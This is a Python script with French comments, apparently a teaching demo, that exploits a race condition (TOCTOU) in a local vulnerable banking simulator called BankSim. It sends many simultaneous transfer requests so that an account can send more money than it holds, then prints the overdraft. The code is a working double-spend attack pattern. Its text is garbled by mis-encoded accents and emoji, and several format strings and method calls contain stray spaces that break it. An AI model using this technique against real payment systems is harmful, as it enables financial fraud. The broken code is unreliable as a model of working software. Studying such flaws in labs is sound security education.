#!/usr/bin/env python3
"""
ğŸš€ EXPLOIT SCRIPT - Race Condition Demonstration (Python)

Ce script dÃ©montre l'exploitation d'une race condition
en envoyant plusieurs requÃªtes de transfert simultanÃ©es. 

Usage: python exploit/exploit.py
DÃ©pendances: pip install aiohttp
"""

import asyncio
import aiohttp
import argparse
import time
from typing import List, Dict, Any

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# CONFIGURATION
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

CONFIG = {
    "base_url": "http://localhost:3000",
    "from_account": 1,      # Alice
    "to_account": 2,        # Bob
    "amount_per_request": 100,
    "number_of_requests": 10
}

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# HTTP HELPERS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

async def get_accounts(session: aiohttp.ClientSession) -> Dict[str, Any]:
    """RÃ©cupÃ¨re tous les comptes"""
    async with session.get(f"{CONFIG['base_url']}/api/accounts") as response:
        return await response.json()

async def transfer(
    session: aiohttp.ClientSession, 
    from_acc: int, 
    to_acc: int, 
    amount: float,
    request_id: int
) -> Dict[str, Any]:
    """Effectue un transfert"""
    payload = {
        "from": from_acc,
        "to": to_acc,
        "amount": amount
    }
    
    try:
        async with session.post(
            f"{CONFIG['base_url']}/api/transfer",
            json=payload
        ) as response:
            result = await response.json()
            result["request_id"] = request_id
            return result
    except Exception as e:
        return {
            "request_id": request_id,
            "success": False,
            "error": str(e)
        }

async def reset_database(session: aiohttp.ClientSession) -> Dict[str, Any]:
    """RÃ©initialise la base de donnÃ©es"""
    async with session.post(f"{CONFIG['base_url']}/api/reset") as response:
        return await response.json()

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# DISPLAY HELPERS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def print_separator(char: str = "â•", length: int = 60):
    """Affiche une ligne de sÃ©paration"""
    print(char * length)

def print_balances(accounts: List[Dict], title: str):
    """Affiche les soldes des comptes"""
    print(f"\nğŸ“Š {title}:")
    
    total = 0
    for acc in accounts:
        status = "âš ï¸  NÃ‰GATIF!" if acc["balance"] < 0 else ""
        print(f"   {acc['name']}: {acc['balance']:. 2f}â‚¬ {status}")
        total += acc["balance"]
    
    print("   " + "â”€" * 17)
    print(f"   Total: {total:.2f}â‚¬ (attendu: 2000â‚¬)")
    
    if total != 2000:
        print(f"   ğŸš¨ ANOMALIE DÃ‰TECTÃ‰E: {total - 2000:. 2f}â‚¬")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# EXPLOIT LOGIC
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

async def run_exploit():
    """ExÃ©cute l'exploitation de la race condition"""
    
    print("\n")
    print_separator()
    print("  ğŸ¦ BANKSIM - Exploit de Race Condition (Python)")
    print_separator()
    
    print("\nğŸ”§ Configuration:")
    print(f"   RequÃªtes simultanÃ©es: {CONFIG['number_of_requests']}")
    print(f"   Montant par requÃªte: {CONFIG['amount_per_request']}â‚¬")
    print(f"   De: Compte #{CONFIG['from_account']} (Alice)")
    print(f"   Vers: Compte #{CONFIG['to_account']} (Bob)")
    
    async with aiohttp.ClientSession() as session:
        # Step 1: Reset database
        print("\nğŸ”„ RÃ©initialisation de la base de donnÃ©es...")
        await reset_database(session)
        
        # Step 2: Get initial balances
        initial_data = await get_accounts(session)
        
        if not initial_data. get("success"):
            print("âŒ Erreur: Impossible de rÃ©cupÃ©rer les comptes")
            return
        
        print_balances(initial_data["accounts"], "Ã‰tat initial")
        
        initial_alice = next(
            (a for a in initial_data["accounts"] if a["id"] == CONFIG["from_account"]), 
            None
        )
        initial_bob = next(
            (a for a in initial_data["accounts"] if a["id"] == CONFIG["to_account"]), 
            None
        )
        
        # Step 3: Prepare concurrent requests
        print("\nâš¡ PrÃ©paration des requÃªtes simultanÃ©es...")
        
        # Step 4: Execute all requests simultaneously
        print(f"\nğŸš€ Envoi de {CONFIG['number_of_requests']} requÃªtes simultanÃ©es...")
        print_separator("â”€")
        
        start_time = time.time()
        
        # Create all transfer tasks
        tasks = [
            transfer(
                session,
                CONFIG["from_account"],
                CONFIG["to_account"],
                CONFIG["amount_per_request"],
                i + 1
            )
            for i in range(CONFIG["number_of_requests"])
        ]
        
        # Execute all tasks concurrently
        results = await asyncio.gather(*tasks)
        
        end_time = time.time()
        execution_time = (end_time - start_time) * 1000  # Convert to ms
        
        # Step 5: Analyze results
        print("\nğŸ“ RÃ©sultats des requÃªtes:")
        
        success_count = 0
        fail_count = 0
        
        for result in sorted(results, key=lambda x: x. get("request_id", 0)):
            req_id = result.get("request_id", "? ")
            if result.get("success"):
                print(f"   âœ… RequÃªte #{req_id}: SuccÃ¨s")
                success_count += 1
            else:
                error_msg = result.get("error", "Solde insuffisant")
                print(f"   âŒ RequÃªte #{req_id}: Ã‰chec - {error_msg}")
                fail_count += 1
        
        # Step 6: Get final balances
        final_data = await get_accounts(session)
        print_balances(final_data["accounts"], "Ã‰tat final")
        
        final_alice = next(
            (a for a in final_data["accounts"] if a["id"] == CONFIG["from_account"]), 
            None
        )
        final_bob = next(
            (a for a in final_data["accounts"] if a["id"] == CONFIG["to_account"]), 
            None
        )
        
        # Step 7: Summary
        print_separator()
        print("  ğŸ“ˆ RÃ‰SUMÃ‰ DE L'EXPLOITATION")
        print_separator()
        
        print(f"\nâ±ï¸  Temps d'exÃ©cution: {execution_time:.2f}ms")
        print(f"ğŸ“Š Statistiques:")
        print(f"   RequÃªtes rÃ©ussies: {success_count}/{CONFIG['number_of_requests']}")
        print(f"   RequÃªtes Ã©chouÃ©es: {fail_count}/{CONFIG['number_of_requests']}")
        
        total_transferred = success_count * CONFIG["amount_per_request"]
        print(f"\nğŸ’° Analyse financiÃ¨re:")
        print(f"   Solde initial d'Alice: {initial_alice['balance']:.2f}â‚¬")
        print(f"   Total transfÃ©rÃ©: {total_transferred:.2f}â‚¬")
        print(f"   Solde final d'Alice: {final_alice['balance']:.2f}â‚¬")
        print(f"   Gain de Bob: {final_bob['balance'] - initial_bob['balance']:.2f}â‚¬")
        
        # Check if exploit was successful
        exploit_successful = total_transferred > initial_alice["balance"]
        
        print("\n")
        print_separator()
        
        if exploit_successful:
            print("  ğŸ’¥ EXPLOITATION RÃ‰USSIE!")
            print_separator()
            print(f"\n  Alice a transfÃ©rÃ© {total_transferred:. 2f}â‚¬")
            print(f"  alors qu'elle n'avait que {initial_alice['balance']:.2f}â‚¬!")
            
            if final_alice["balance"] < 0:
                print(f"\n  âš ï¸  Son solde est maintenant NÃ‰GATIF: {final_alice['balance']:.2f}â‚¬")
            
            print("\n  ğŸ” Explication:")
            print("  Plusieurs requÃªtes ont vÃ©rifiÃ© le solde simultanÃ©ment")
            print("  AVANT que les autres ne le mettent Ã  jour.")
            print("  C'est une vulnÃ©rabilitÃ© TOCTOU (Time Of Check To Time Of Use).")
        else:
            print("  â„¹ï¸  EXPLOITATION NON CONCLUANTE")
            print_separator()
            print("\n  Le timing n'a pas permis d'exploiter la faille cette fois.")
            print("  Suggestions:")
            print("  - Augmentez le nombre de requÃªtes (-n 20)")
            print("  - Relancez le script plusieurs fois")
            print("  - VÃ©rifiez que le serveur vulnÃ©rable est bien lancÃ©")
        
        print("\n")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MAIN
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def main():
    """Point d'entrÃ©e principal"""
    parser = argparse. ArgumentParser(
        description="ğŸ¦ BankSim Exploit Script - Race Condition Demonstration",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples:
  python exploit. py
  python exploit.py -n 20 -a 50
  python exploit.py --requests 15 --amount 200
        """
    )
    
    parser.add_argument(
        "-n", "--requests",
        type=int,
        default=10,
        help="Nombre de requÃªtes simultanÃ©es (dÃ©faut: 10)"
    )
    
    parser.add_argument(
        "-a", "--amount",
        type=float,
        default=100,
        help="Montant par requÃªte en â‚¬ (dÃ©faut: 100)"
    )
    
    parser. add_argument(
        "-u", "--url",
        type=str,
        default="http://localhost:3000",
        help="URL du serveur (dÃ©faut: http://localhost:3000)"
    )
    
    args = parser.parse_args()
    
    # Update config
    CONFIG["number_of_requests"] = args.requests
    CONFIG["amount_per_request"] = args.amount
    CONFIG["base_url"] = args.url
    
    # Run exploit
    try:
        asyncio.run(run_exploit())
    except aiohttp.ClientError as e:
        print(f"\nâŒ Erreur de connexion: {e}")
        print("   VÃ©rifiez que le serveur est lancÃ© sur", CONFIG["base_url"])
    except KeyboardInterrupt:
        print("\n\nâš ï¸  Exploitation interrompue par l'utilisateur")

if __name__ == "__main__":
    main()